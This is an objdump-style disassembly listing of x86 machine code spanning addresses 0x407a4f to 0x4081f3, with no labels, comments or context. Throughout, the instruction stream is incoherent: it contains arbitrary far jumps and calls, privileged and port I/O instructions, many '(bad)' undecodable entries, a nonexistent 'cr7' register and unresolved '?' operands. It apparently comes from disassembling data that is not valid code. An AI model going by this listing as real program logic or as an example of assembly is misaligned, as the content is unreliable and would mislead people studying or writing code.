  407a4f:	loopne 0x407aa1
  407a51:	mov    ebp,0x7df1ed86
  407a56:	test   al,0x9
  407a58:	fdivr  DWORD PTR [esi]
  407a5a:	pop    esi
  407a5b:	and    DWORD PTR [edi+0x38d508be],edx
  407a61:	jns    0x4079f4
  407a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a64:	ror    DWORD PTR [edi],0xc1
  407a67:	cli    
  407a68:	xchg   edi,eax
  407a69:	push   esi
  407a6a:	inc    ecx
  407a6b:	dec    edx
  407a6c:	sbb    DWORD PTR [ebp+0x6644b4a5],ebx
  407a72:	lods   al,BYTE PTR ds:[esi]
  407a73:	push   esi
  407a74:	add    eax,0xe436a443
  407a79:	lods   al,BYTE PTR ds:[esi]
  407a7a:	mov    cr7,eax
  407a7d:	dec    esp
  407a7e:	jmp    0xfc6c7abe
  407a83:	mov    ah,BYTE PTR [eax]
  407a85:	xchg   ebp,eax
  407a86:	das    
  407a87:	sub    DWORD PTR [edx],ecx
  407a89:	ss sbb edi,ebx
  407a8c:	mov    al,ds:0xbc7f5740
  407a91:	ja     0x407ad6
  407a93:	jae    0x407ac5
  407a95:	mov    esi,ebx
  407a97:	add    esp,edi
  407a99:	lds    esp,FWORD PTR [edi]
  407a9b:	sub    al,0x66
  407a9d:	mov    bl,0x5e
  407a9f:	std    
  407aa0:	stos   BYTE PTR es:[edi],al
  407aa1:	and    DWORD PTR [esi-0x247e3bf7],esp
  407aa7:	push   edi
  407aa8:	lods   al,BYTE PTR ds:[esi]
  407aa9:	enter  0xd337,0x86
  407aad:	outs   dx,DWORD PTR ds:[esi]
  407aae:	imul   eax,ebx,0xffffff9d
  407ab1:	inc    eax
  407ab2:	arpl   WORD PTR [ecx-0x5b],si
  407ab5:	mov    BYTE PTR [ebp-0x4a],bh
  407ab8:	ja     0x407a56
  407aba:	pusha  
  407abb:	pop    ecx
  407abc:	test   BYTE PTR [eax-0x39],bl
  407abf:	dec    ebp
  407ac0:	mov    ecx,edi
  407ac2:	sti    
  407ac3:	sbb    bl,bl
  407ac5:	mov    esi,0x9fb135e6
  407aca:	fbld   TBYTE PTR [edi-0x5f]
  407acd:	jecxz  0x407aa3
  407acf:	fdivr  QWORD PTR [eax+0x7b3713f1]
  407ad5:	jmp    0xcf17:0x3aa897eb
  407adc:	adc    eax,0x4f991e1c
  407ae1:	jmp    0x407b14
  407ae3:	in     eax,dx
  407ae4:	ficom  WORD PTR [ebp+0x38]
  407ae7:	jb     0x407b32
  407ae9:	sbb    al,0xbd
  407aeb:	test   eax,0x7801c2fb
  407af0:	jmp    0xb80806e5
  407af5:	out    dx,al
  407af6:	cmp    edx,eax
  407af8:	imul   ebp,DWORD PTR [esi],0x71
  407afb:	cmp    esi,esp
  407afd:	dec    edx
  407afe:	pop    esi
  407aff:	or     edx,esp
  407b01:	inc    eax
  407b02:	jmp    0xea26ede8
  407b07:	js     0x407b62
  407b09:	mov    bl,BYTE PTR [ebx]
  407b0b:	in     al,dx
  407b0c:	push   ebp
  407b0d:	scas   al,BYTE PTR es:[edi]
  407b0e:	mov    al,0x27
  407b10:	imul   ebp,DWORD PTR [esi+0xa],0xa1c93661
  407b17:	xor    al,0x9a
  407b19:	or     eax,DWORD PTR [edx-0x2a4e398e]
  407b1f:	and    al,0x54
  407b21:	pushf  
  407b22:	les    esp,FWORD PTR [edi-0x746c5601]
  407b28:	cmp    al,0x6b
  407b2a:	das    
  407b2b:	fwait
  407b2c:	les    ecx,FWORD PTR [ecx+0x3b2cc6fb]
  407b32:	jp     0x407b48
  407b34:	popa   
  407b35:	clc    
  407b36:	pop    esp
  407b37:	cmc    
  407b38:	jge    0x407ae8
  407b3a:	cdq    
  407b3b:	sub    eax,0xd3209e1d
  407b40:	addr16 call 0x3817:0x7a26a68
  407b48:	test   dh,bh
  407b4a:	loope  0x407b58
  407b4c:	mov    eax,?
  407b4e:	popa   
  407b4f:	dec    esi
  407b50:	ret    0x91e5
  407b53:	jne    0x407bb6
  407b55:	mov    ds:0x809da72b,eax
  407b5a:	cld    
  407b5b:	arpl   bx,sp
  407b5d:	xchg   ebp,eax
  407b5e:	pop    esi
  407b5f:	mov    eax,ds:0xa51ccfa8
  407b64:	bound  eax,QWORD PTR [ecx-0x50]
  407b67:	mov    WORD PTR [ecx-0x6e8a167c],ss
  407b6d:	les    ebx,FWORD PTR [ecx]
  407b6f:	or     BYTE PTR [eax-0x2f],ah
  407b72:	retf   
  407b73:	scas   eax,DWORD PTR es:[edi]
  407b74:	inc    eax
  407b75:	xor    DWORD PTR [ecx+0x54],ebx
  407b78:	jecxz  0x407b11
  407b7a:	clc    
  407b7b:	push   eax
  407b7c:	or     al,0x32
  407b7e:	jg     0x407b42
  407b80:	sbb    al,0x81
  407b82:	ja     0x407b26
  407b84:	shl    BYTE PTR [edx+0x45],cl
  407b87:	mov    esi,0x5479500b
  407b8c:	or     eax,0x793210f2
  407b91:	add    DWORD PTR [eax+edx*4],ebx
  407b94:	stc    
  407b95:	jns    0x407b24
  407b97:	xchg   esi,eax
  407b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b99:	xor    eax,0x56eea880
  407b9e:	or     DWORD PTR [ebx-0x779d6315],eax
  407ba4:	mulps  xmm6,XMMWORD PTR [ecx+0x28fe59af]
  407bab:	ja     0x407bd4
  407bad:	hlt    
  407bae:	and    dl,BYTE PTR [esi-0x70de4e0f]
  407bb4:	add    esp,DWORD PTR [ecx]
  407bb6:	mov    eax,ds:0xeef35b0
  407bbb:	into   
  407bbc:	xor    DWORD PTR [edi],ebx
  407bbe:	or     eax,0x5c2cc694
  407bc3:	dec    esp
  407bc4:	push   ecx
  407bc5:	xchg   DWORD PTR [ecx+esi*8+0x7d],eax
  407bc9:	jmp    0x89d7:0x2774639
  407bd0:	(bad)  
  407bd1:	popa   
  407bd2:	out    0x98,eax
  407bd4:	test   BYTE PTR [edx+0x30],dh
  407bd7:	(bad)  
  407bd8:	nop
  407bd9:	sbb    al,0x7
  407bdb:	call   0x8ced:0x64e11673
  407be2:	outs   dx,DWORD PTR ds:[esi]
  407be3:	dec    eax
  407be4:	jmp    0x407bea
  407be6:	push   esp
  407be7:	popa   
  407be8:	jecxz  0x407c45
  407bea:	push   ss
  407beb:	mov    ds:0x295b8052,eax
  407bf0:	fadd   st(3),st
  407bf2:	xchg   esp,eax
  407bf3:	das    
  407bf4:	scas   al,BYTE PTR es:[edi]
  407bf5:	sbb    DWORD PTR [edi],eax
  407bf7:	sbb    DWORD PTR [esi+0x7b],edx
  407bfa:	fmul   st(5),st
  407bfc:	xor    al,BYTE PTR [ebx+0x63]
  407bff:	sub    eax,0xc50c55a1
  407c04:	and    ch,bh
  407c06:	mov    ch,0x96
  407c08:	xlat   BYTE PTR ds:[ebx]
  407c09:	sbb    dl,cl
  407c0b:	jbe    0x407c7f
  407c0d:	mov    ecx,0x612a426e
  407c12:	rcr    DWORD PTR [edi+0x1b],cl
  407c15:	and    cx,0xff91
  407c19:	and    al,0xce
  407c1b:	pop    es
  407c1c:	mov    esi,0x140fbd6f
  407c21:	jbe    0x407ba9
  407c23:	mov    bh,0x79
  407c25:	jl     0x407c8e
  407c27:	retf   
  407c28:	les    eax,FWORD PTR [ebx]
  407c2a:	rcl    BYTE PTR [ecx-0x1ce295e4],1
  407c30:	sbb    ecx,DWORD PTR [ebx]
  407c32:	std    
  407c33:	fidivr WORD PTR [ebx]
  407c35:	xchg   esi,eax
  407c36:	mov    ss,WORD PTR [ebp*8+0x1aa22759]
  407c3d:	icebp  
  407c3e:	sub    ebp,esp
  407c40:	mov    esi,0x4616bdfc
  407c45:	or     bh,dh
  407c47:	test   DWORD PTR [esp+eax*8],ebx
  407c4a:	out    dx,al
  407c4b:	dec    esp
  407c4c:	dec    esp
  407c4d:	fisttp WORD PTR [edx+0x34]
  407c50:	rcl    DWORD PTR [ecx+0x54],1
  407c53:	imul   ebx,DWORD PTR [ecx],0xffffffa7
  407c56:	test   al,0x2b
  407c58:	ins    BYTE PTR es:[di],dx
  407c5a:	fcmovne st,st(3)
  407c5c:	push   esp
  407c5d:	hlt    
  407c5e:	stos   BYTE PTR es:[edi],al
  407c5f:	and    eax,0x457d53b1
  407c64:	push   cs
  407c65:	xor    bh,BYTE PTR [ebx]
  407c67:	jne    0x407cbc
  407c69:	or     dh,BYTE PTR [ecx+0x1a9ea3d3]
  407c6f:	(bad)  
  407c70:	mov    esp,DWORD PTR ds:0xb6d394d5
  407c76:	jo     0x407c55
  407c78:	dec    ecx
  407c79:	popa   
  407c7a:	push   ecx
  407c7b:	jnp    0x4db27ecb
  407c81:	neg    BYTE PTR [edx-0x20]
  407c84:	cmp    DWORD PTR [edi+0x57],edi
  407c87:	inc    edx
  407c88:	ror    ah,cl
  407c8a:	sti    
  407c8b:	mov    ah,0x9d
  407c8d:	repnz pushf 
  407c8f:	or     al,0xbd
  407c91:	iret   
  407c92:	adc    bh,BYTE PTR [esi-0x34]
  407c95:	lock push edi
  407c97:	mov    al,ds:0xdfcc4cee
  407c9c:	add    edx,DWORD PTR [edi+edx*2-0x373bb76d]
  407ca3:	push   edi
  407ca4:	xor    eax,0xc6e8aecf
  407ca9:	lock inc ecx
  407cab:	mov    eax,es:0x5fa5193
  407cb1:	mov    eax,0x4989d46e
  407cb6:	pop    es
  407cb7:	mov    DWORD PTR [edx-0x673d886],edx
  407cbd:	push   edi
  407cbe:	dec    ebx
  407cbf:	dec    edx
  407cc0:	xchg   edx,eax
  407cc1:	push   esi
  407cc2:	dec    esi
  407cc3:	sub    ah,dh
  407cc5:	lock xchg edx,eax
  407cc7:	out    dx,al
  407cc8:	ins    BYTE PTR es:[edi],dx
  407cc9:	repz sbb dl,BYTE PTR [ebx]
  407ccc:	popa   
  407ccd:	ins    BYTE PTR es:[edi],dx
  407cce:	outs   dx,BYTE PTR ds:[esi]
  407ccf:	dec    edi
  407cd0:	xchg   BYTE PTR [edi],bl
  407cd2:	retf   
  407cd3:	inc    edi
  407cd4:	call   0xe3dd:0x69062d9
  407cdb:	ins    DWORD PTR es:[edi],dx
  407cdc:	into   
  407cdd:	stos   BYTE PTR es:[edi],al
  407cde:	pop    ecx
  407cdf:	int    0xc8
  407ce1:	fld    QWORD PTR [edi+0x6e]
  407ce4:	in     eax,dx
  407ce5:	cmp    eax,DWORD PTR [eax+0x1b]
  407ce8:	push   ecx
  407ce9:	jb     0x407c72
  407ceb:	iret   
  407cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ced:	cmp    al,0xd5
  407cef:	dec    edi
  407cf0:	jbe    0x407c80
  407cf2:	inc    ebx
  407cf3:	out    0x4f,eax
  407cf5:	cli    
  407cf6:	xchg   edi,eax
  407cf7:	mov    eax,ds:0x55b3fee5
  407cfc:	and    al,0x58
  407cfe:	sub    eax,0xa490e44d
  407d03:	ret    
  407d04:	mov    esi,0x4716b257
  407d09:	cmp    DWORD PTR [esi],0xffffffd8
  407d0c:	inc    ecx
  407d0d:	scas   al,BYTE PTR es:[edi]
  407d0e:	xor    eax,DWORD PTR [eax]
  407d10:	cmp    esp,esp
  407d12:	into   
  407d13:	jmp    0x407d7d
  407d15:	js     0x407d71
  407d17:	dec    edi
  407d18:	mov    edi,0xe829dfb0
  407d1d:	clc    
  407d1e:	outs   dx,DWORD PTR ds:[esi]
  407d1f:	add    dh,cl
  407d21:	xor    eax,0x1d9d6dfc
  407d26:	sahf   
  407d27:	mov    DWORD PTR [esp+edx*1+0x2d80ad5],edi
  407d2e:	xchg   esi,eax
  407d2f:	pushf  
  407d30:	out    0x70,al
  407d32:	push   edi
  407d33:	dec    esp
  407d34:	clc    
  407d35:	jne    0x407d0b
  407d37:	sbb    al,0x7a
  407d39:	mov    DWORD PTR [ebx+edi*4+0xf224daa],ebp
  407d40:	push   edx
  407d41:	pop    ebx
  407d42:	(bad)  
  407d43:	mov    eax,ds:0x502d5884
  407d48:	and    eax,0x6c5c64aa
  407d4d:	jecxz  0x407da3
  407d4f:	aad    0xb0
  407d51:	stc    
  407d52:	xor    al,0xf3
  407d54:	test   BYTE PTR [edx+0x79],ch
  407d57:	lock pusha 
  407d59:	push   ss
  407d5a:	scas   al,BYTE PTR es:[edi]
  407d5b:	cmp    DWORD PTR [edi-0xce1d6e],0xffffffdf
  407d62:	mov    al,0x45
  407d64:	rcr    BYTE PTR [esi],0x11
  407d67:	shr    cl,1
  407d69:	sbb    bl,BYTE PTR [ebx]
  407d6b:	enter  0x8fc,0x87
  407d6f:	test   edi,esi
  407d71:	inc    ecx
  407d72:	inc    ebp
  407d73:	or     esi,DWORD PTR ds:[ecx+0x3a78bb26]
  407d7a:	out    0xa9,eax
  407d7c:	add    ch,dh
  407d7e:	(bad)  
  407d7f:	mov    dl,0xf9
  407d81:	out    0x1f,al
  407d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d84:	data16 std 
  407d86:	mov    edx,0xc2791371
  407d8b:	inc    ebx
  407d8c:	stc    
  407d8d:	jmp    0x407d45
  407d8f:	inc    edi
  407d90:	and    BYTE PTR [esi+0x2aa0356c],dl
  407d96:	lods   al,BYTE PTR ds:[esi]
  407d97:	fwait
  407d98:	inc    eax
  407d99:	sbb    esp,DWORD PTR [edx]
  407d9b:	dec    esp
  407d9c:	pop    ebx
  407d9d:	cli    
  407d9e:	scas   al,BYTE PTR es:[edi]
  407d9f:	pop    esp
  407da0:	ror    BYTE PTR [ecx-0x77],0x55
  407da4:	shr    BYTE PTR [edi-0x35],1
  407da7:	push   esi
  407da8:	adc    cl,BYTE PTR [ecx+0x1e07e16f]
  407dae:	push   eax
  407daf:	add    al,0x36
  407db1:	mov    edx,0x3424cfeb
  407db6:	out    0xdb,eax
  407db8:	jle    0x407dbe
  407dba:	inc    esp
  407dbb:	xor    BYTE PTR [edx],ch
  407dbd:	popa   
  407dbe:	retf   
  407dbf:	retf   
  407dc0:	cmp    al,0x58
  407dc2:	out    dx,eax
  407dc3:	lahf   
  407dc4:	aad    0xa8
  407dc6:	outs   dx,DWORD PTR ds:[esi]
  407dc7:	xor    al,0x76
  407dc9:	retf   
  407dca:	fstp   DWORD PTR [ebp+0x39]
  407dcd:	mov    dl,0x51
  407dcf:	push   ss
  407dd0:	test   DWORD PTR [eax-0x48],edx
  407dd3:	push   0xffffffe8
  407dd5:	pop    esi
  407dd6:	jbe    0x407dc2
  407dd8:	in     eax,0x34
  407dda:	sub    DWORD PTR [eax],esp
  407ddc:	jmp    0xca8f:0xe156db59
  407de3:	lds    ebx,FWORD PTR [edi-0x6a]
  407de6:	xchg   ebx,eax
  407de7:	das    
  407de8:	loopne 0x407e32
  407dea:	test   eax,0x2ad8358
  407def:	add    BYTE PTR ds:0xf1c202d4,bh
  407df5:	xchg   esi,eax
  407df6:	lock lahf 
  407df8:	cmp    BYTE PTR [ecx],ah
  407dfa:	inc    edi
  407dfb:	mov    WORD PTR [ebx-0x4779216f],gs
  407e01:	mov    eax,0xf1717294
  407e06:	fisttp DWORD PTR [ebp-0x19]
  407e09:	pushf  
  407e0a:	sbb    DWORD PTR [edx-0x51010896],0x9
  407e11:	sbb    DWORD PTR [ebp-0x67],edi
  407e14:	mov    ds:0x48c88826,al
  407e19:	push   eax
  407e1a:	cwde   
  407e1b:	jle    0x407e67
  407e1d:	pop    ss
  407e1e:	retf   0x10bf
  407e21:	lahf   
  407e22:	mov    bh,BYTE PTR [ebx+0xf3bd21b]
  407e28:	mov    al,0xa1
  407e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e2b:	jns    0x407dec
  407e2d:	dec    ebp
  407e2e:	fild   DWORD PTR [esi]
  407e30:	mov    esi,0x8164b9f2
  407e35:	in     eax,dx
  407e36:	stc    
  407e37:	or     eax,0x1f22b2e7
  407e3c:	shl    DWORD PTR [esi+esi*1],1
  407e3f:	mov    DWORD PTR [ebx+0x7e342298],ecx
  407e45:	jne    0x407e4e
  407e47:	fidiv  WORD PTR [edi+0x14]
  407e4a:	jmp    0x407ddc
  407e4c:	mov    ds:0xd9ce34ad,eax
  407e51:	dec    ecx
  407e52:	es pushf 
  407e54:	ror    BYTE PTR [esi+0x70dadaaa],cl
  407e5a:	es xchg ebx,eax
  407e5c:	bound  esi,QWORD PTR [ebx]
  407e5e:	jae    0x407e31
  407e60:	pushf  
  407e61:	mov    cl,0xbf
  407e63:	dec    ebx
  407e64:	arpl   WORD PTR [ebx],bx
  407e66:	xlat   BYTE PTR ds:[ebx]
  407e67:	rcr    BYTE PTR es:[esi-0x79],1
  407e6b:	add    ebp,DWORD PTR [ecx+0x21]
  407e6e:	push   esp
  407e6f:	jmp    0x2b6f:0xd12e4d5a
  407e76:	jno    0x407e2c
  407e78:	dec    ebx
  407e79:	xchg   ebx,eax
  407e7a:	adc    bl,dl
  407e7c:	fmul   st,st(0)
  407e7e:	mov    al,ds:0x17ac7861
  407e83:	adc    al,0x68
  407e85:	repnz out 0xd,eax
  407e88:	repz rep stos BYTE PTR es:[edi],al
  407e8b:	push   0xc58e70a3
  407e90:	sbb    DWORD PTR [esi+0x2],esp
  407e93:	jg     0x407e53
  407e95:	or     DWORD PTR [edi+0x4b],ebp
  407e98:	ds push ss
  407e9a:	(bad)  
  407e9b:	ret    0x433e
  407e9e:	das    
  407e9f:	or     eax,0x2801e933
  407ea4:	in     eax,dx
  407ea5:	mov    ah,0xc8
  407ea7:	pop    ds
  407ea8:	push   edx
  407ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eaa:	dec    esi
  407eab:	outs   dx,BYTE PTR ds:[esi]
  407eac:	inc    edx
  407ead:	mov    ecx,DWORD PTR [eax-0x32]
  407eb0:	lea    edx,ds:0xca1a756b
  407eb6:	pop    ebp
  407eb7:	and    esp,eax
  407eb9:	pop    ebx
  407eba:	fs fdiv st,st(1)
  407ebd:	sub    DWORD PTR [edi+0x4be8f795],edi
  407ec3:	lods   eax,DWORD PTR ds:[esi]
  407ec4:	cmp    edx,edi
  407ec6:	call   DWORD PTR [ebp-0x57a9d333]
  407ecc:	lods   eax,DWORD PTR ds:[esi]
  407ecd:	xor    dl,cl
  407ecf:	jg     0x407e93
  407ed1:	loope  0x407e89
  407ed3:	jmp    0x407e95
  407ed5:	pop    ebx
  407ed6:	test   ch,dl
  407ed8:	xchg   edi,eax
  407ed9:	out    dx,al
  407eda:	hlt    
  407edb:	mov    al,0x68
  407edd:	js     0x407eaa
  407edf:	std    
  407ee0:	sbb    al,0x45
  407ee2:	add    al,0x17
  407ee4:	test   DWORD PTR [esi-0x39],0x88b6e9f4
  407eeb:	and    ecx,eax
  407eed:	pop    ss
  407eee:	push   esp
  407eef:	jae    0x407f31
  407ef1:	popf   
  407ef2:	loopne 0x407f3c
  407ef4:	cmc    
  407ef5:	outs   dx,DWORD PTR ds:[esi]
  407ef6:	repnz div ebp
  407ef9:	enter  0x2578,0x66
  407efd:	jmp    0x407ea7
  407eff:	dec    eax
  407f00:	imul   esp,edi,0xd
  407f03:	jmp    0xe056:0x99ff43d7
  407f0a:	push   esp
  407f0b:	push   esp
  407f0c:	pop    edx
  407f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f0e:	push   edx
  407f0f:	adc    DWORD PTR [eax+ecx*2+0x51d97820],edi
  407f16:	mov    esp,0x26f7d3ca
  407f1b:	cli    
  407f1c:	int3   
  407f1d:	je     0x407f38
  407f1f:	pop    ebp
  407f20:	cdq    
  407f21:	aaa    
  407f22:	jne    0x407f95
  407f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f25:	sub    DWORD PTR [edx+0x4b],edx
  407f28:	fwait
  407f29:	sub    bl,0x52
  407f2c:	dec    ebp
  407f2d:	sub    al,0xa7
  407f2f:	and    al,0x2b
  407f31:	xchg   esi,eax
  407f32:	call   0x7de5:0x6c45a027
  407f39:	call   0xe46:0x9affcd96
  407f40:	push   es
  407f41:	mov    ds:0xb7e519ee,eax
  407f46:	adc    DWORD PTR [ebp+0x26],eax
  407f49:	jl     0x407f48
  407f4b:	jg     0x407fb0
  407f4d:	mov    ebx,ecx
  407f4f:	pusha  
  407f50:	add    BYTE PTR [edi],cl
  407f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f53:	out    0x20,al
  407f55:	jne    0x407f3a
  407f57:	jns    0x407f66
  407f59:	loop   0x407f8b
  407f5b:	mov    ebx,0x9c903772
  407f60:	rcl    edi,cl
  407f62:	fwait
  407f63:	mov    esi,0x1693e1b1
  407f68:	push   edi
  407f69:	pop    eax
  407f6a:	push   ecx
  407f6b:	pop    edx
  407f6c:	mov    edi,0x436a29bf
  407f71:	sbb    DWORD PTR [edx],0x20
  407f74:	push   esp
  407f75:	mov    dl,0x1a
  407f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f78:	mov    ds:0x7a0a1cf9,eax
  407f7d:	push   ds
  407f7e:	call   0x180464e6
  407f83:	ret    0x7a0b
  407f86:	lods   al,BYTE PTR ds:[esi]
  407f87:	ret    0xbe03
  407f8a:	(bad)  [ebx-0x14e2107a]
  407f90:	in     eax,0x9d
  407f92:	xlat   BYTE PTR ds:[ebx]
  407f93:	int    0xa6
  407f95:	aam    0xa7
  407f97:	xchg   esp,eax
  407f98:	test   al,0x3c
  407f9a:	and    bh,BYTE PTR [ebx-0x2b96dd80]
  407fa0:	fldcw  WORD PTR [ebp+0x17893d69]
  407fa6:	mov    ds:0x958a8f69,eax
  407fab:	jns    0x407f86
  407fad:	and    ah,BYTE PTR [eax+eax*2]
  407fb0:	xor    eax,0x6b973a0c
  407fb5:	mov    ah,0x4c
  407fb7:	mov    ch,dh
  407fb9:	xor    BYTE PTR [edi+0x20a5ac06],bl
  407fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc0:	cmp    al,0x1b
  407fc2:	pop    esi
  407fc3:	dec    esp
  407fc4:	pop    esp
  407fc5:	jmp    0x769d:0x40cb6420
  407fcc:	mov    ah,0x7b
  407fce:	xor    eax,0x44f9f551
  407fd3:	cli    
  407fd4:	(bad)
  407fd8:	div    BYTE PTR [edx+0x186d77b8]
  407fde:	add    al,0x7c
  407fe0:	aas    
  407fe1:	xor    eax,0xf874e545
  407fe6:	fidivr WORD PTR [ebp-0x4d44ab85]
  407fec:	mov    ebp,0xca34ef8f
  407ff1:	xor    BYTE PTR [ebx-0x73],bh
  407ff4:	scas   eax,DWORD PTR es:[edi]
  407ff5:	pushf  
  407ff6:	push   ebp
  407ff7:	adc    BYTE PTR [ebx-0x43149acd],ah
  407ffd:	sbb    BYTE PTR [ebp-0x1],dh
  408000:	arpl   WORD PTR [edx+esi*8],bx
  408003:	mov    ebp,0xe9be1ea0
  408008:	xor    ebp,DWORD PTR [ecx-0x287d5f85]
  40800e:	call   0xe499f555
  408013:	pop    ss
  408014:	mov    eax,ds:0x64d95a2a
  408019:	lods   eax,DWORD PTR ds:[esi]
  40801a:	leave  
  40801b:	or     ch,BYTE PTR [esi]
  40801d:	jmp    0x407fbd
  40801f:	stos   DWORD PTR es:[edi],eax
  408020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408021:	mov    ds:0x7e498756,eax
  408026:	inc    edi
  408027:	arpl   WORD PTR [ebp-0x2dd4bb88],bp
  40802d:	sysret 
  40802f:	mov    esp,0x13bf4170
  408034:	or     BYTE PTR [esi-0x3a672ca8],ah
  40803a:	(bad)  
  40803c:	out    0x6f,eax
  40803e:	je     0x40805a
  408040:	adc    BYTE PTR [ecx-0x4f],al
  408043:	rol    DWORD PTR [ebx+edi*8+0x319ca126],cl
  40804a:	jo     0x4080a9
  40804c:	cli    
  40804d:	fwait
  40804e:	mov    dl,0x4e
  408050:	add    DWORD PTR [ebp+0x66],eax
  408053:	add    bh,BYTE PTR [ecx-0x3ad8ca89]
  408059:	clc    
  40805a:	stc    
  40805b:	outs   dx,DWORD PTR gs:[esi]
  40805d:	xlat   BYTE PTR ds:[ebx]
  40805e:	loope  0x408008
  408060:	mov    ecx,0x188fb5f5
  408065:	mov    cs,WORD PTR [ebp+0x54]
  408068:	or     BYTE PTR [esi-0x2f],bh
  40806b:	data16 fwait
  40806d:	gs adc ax,0x2135
  408072:	mov    edi,0x9f9c5b9c
  408077:	mov    ch,dh
  408079:	push   esi
  40807a:	mov    WORD PTR [ecx+0x5c251394],es
  408080:	xlat   BYTE PTR gs:[ebx]
  408082:	(bad)  
  408083:	add    al,BYTE PTR [esi+0x241222b3]
  408089:	push   0x1d262ffa
  40808e:	mov    al,0x1
  408090:	mov    ds:0x46be13a,al
  408095:	push   eax
  408096:	test   BYTE PTR [edx+ebx*2+0x71],ch
  40809a:	dec    eax
  40809b:	sub    DWORD PTR [esi+0x74],edx
  40809e:	jno    0x40807c
  4080a0:	stos   BYTE PTR es:[edi],al
  4080a1:	dec    eax
  4080a2:	or     cl,dh
  4080a4:	push   0xdb55749a
  4080a9:	xor    al,0x58
  4080ab:	add    eax,0xcaf22bdc
  4080b0:	or     ecx,0x13
  4080b3:	imul   esp,edx,0x2de02f2a
  4080b9:	mov    ecx,edi
  4080bb:	sub    al,bh
  4080bd:	scas   eax,DWORD PTR es:[edi]
  4080be:	xchg   DWORD PTR [edx],esp
  4080c0:	test   ch,dh
  4080c2:	pop    eax
  4080c3:	retf   
  4080c4:	xchg   dh,ah
  4080c6:	inc    esi
  4080c7:	push   ebp
  4080c8:	and    DWORD PTR [ebp+0x18],ebp
  4080cb:	(bad)  
  4080cc:	das    
  4080cd:	imul   esp,DWORD PTR [eax+edi*8],0x72e5123c
  4080d4:	in     al,0x44
  4080d6:	xchg   ebp,eax
  4080d7:	loop   0x408101
  4080d9:	(bad)  
  4080da:	in     al,0x42
  4080dc:	fist   WORD PTR [edi+eax*1+0x496450e6]
  4080e3:	and    BYTE PTR [ebp+0x4f],cl
  4080e6:	push   ds
  4080e7:	mov    ebx,0x7255955e
  4080ec:	dec    ecx
  4080ed:	mov    ch,0xd6
  4080ef:	jmp    0xd7f0:0x16a6459c
  4080f6:	lock fidivr DWORD PTR [ebp+0x7c]
  4080fa:	pop    eax
  4080fb:	mov    al,ds:0x59b9e6cf
  408100:	mov    dh,0x38
  408102:	fistp  QWORD PTR [eax]
  408104:	adc    eax,0x848363a1
  408109:	mov    dh,0x79
  40810b:	cs or  al,0x9a
  40810e:	and    eax,0x89d1df4f
  408113:	xchg   edi,eax
  408114:	dec    ebx
  408115:	pop    eax
  408116:	outs   dx,DWORD PTR ds:[esi]
  408117:	mov    edi,DWORD PTR [esi+0x3a]
  40811a:	repnz (bad) 
  40811d:	adc    eax,0xe919d12e
  408122:	jb     0x408106
  408124:	cli    
  408125:	not    DWORD PTR [eax+0x14889208]
  40812b:	sub    al,0x1c
  40812d:	in     al,dx
  40812e:	mov    ecx,DWORD PTR [esi-0x4a]
  408131:	mov    edi,0xba682142
  408136:	fsubr  DWORD PTR ds:0x181f97b6
  40813c:	cmp    ebx,eax
  40813e:	push   ecx
  40813f:	cmp    ch,BYTE PTR [edx+0x14f5a833]
  408145:	cld    
  408146:	dec    edx
  408147:	mov    ss,WORD PTR [edi+0x19a00682]
  40814d:	loopne 0x40819e
  40814f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408150:	jnp    0x408190
  408152:	je     0x4081ca
  408154:	sub    BYTE PTR [ebx],0x2f
  408157:	pop    edx
  408158:	sub    eax,0xc93101c8
  40815d:	dec    BYTE PTR [ebx+ebp*4+0x5284867b]
  408164:	mov    edi,0xd8dca6b7
  408169:	popa   
  40816a:	cmp    cl,BYTE PTR [eax+0x5b5f0ff1]
  408170:	iret   
  408171:	dec    eax
  408172:	aad    0x8f
  408174:	ja     0x4081c5
  408176:	xor    esi,DWORD PTR [edi+0x42]
  408179:	pusha  
  40817a:	icebp  
  40817b:	cmp    BYTE PTR [ecx+ebx*1],ch
  40817e:	outs   dx,DWORD PTR ds:[esi]
  40817f:	dec    edx
  408180:	mov    eax,0x48a8f29c
  408185:	fstp   TBYTE PTR [ebx+ebp*2]
  408188:	push   ds
  408189:	add    ecx,DWORD PTR [eax-0x21bb8b54]
  40818f:	mov    al,ds:0xceb65410
  408194:	mov    al,ds:0xa957377c
  408199:	and    dh,dh
  40819b:	mov    ecx,0x48eeb136
  4081a0:	mov    es,WORD PTR [edx-0x28683d6b]
  4081a6:	pop    ebx
  4081a7:	add    DWORD PTR [ecx-0x51],edx
  4081aa:	mov    ?,WORD PTR [eax+0x3b51e3a7]
  4081b0:	aam    0xd
  4081b2:	sub    edx,DWORD PTR [ebp+0x71]
  4081b5:	mov    dh,0x77
  4081b7:	adc    bl,BYTE PTR [ecx-0x7b9a2b7b]
  4081bd:	scas   al,BYTE PTR es:[edi]
  4081be:	leave  
  4081bf:	pop    edi
  4081c0:	gs mov dh,0x72
  4081c3:	call   0x362b5f65
  4081c8:	cmp    dl,BYTE PTR ds:0xcffb830a
  4081ce:	ret    
  4081cf:	push   esi
  4081d0:	add    al,0x7d
  4081d2:	push   cs
  4081d3:	xchg   edi,eax
  4081d4:	daa    
  4081d5:	push   ds
  4081d6:	shl    BYTE PTR [esi],1
  4081d8:	pusha  
  4081d9:	adc    ebp,edi
  4081db:	or     ch,BYTE PTR [ecx-0x26]
  4081de:	ins    BYTE PTR es:[edi],dx
  4081df:	lds    ebp,FWORD PTR [esi-0x32118f06]
  4081e5:	jno    0x408244
  4081e7:	xchg   BYTE PTR [esi+ebx*2+0x44],bh
  4081eb:	lods   al,BYTE PTR ds:[esi]
  4081ec:	dec    esp
  4081ed:	(bad)  
  4081ee:	jno    0x40818a
  4081f0:	add    al,BYTE PTR [edx]
  4081f2:	inc    ecx
  4081f3:	sbb    bl,bh
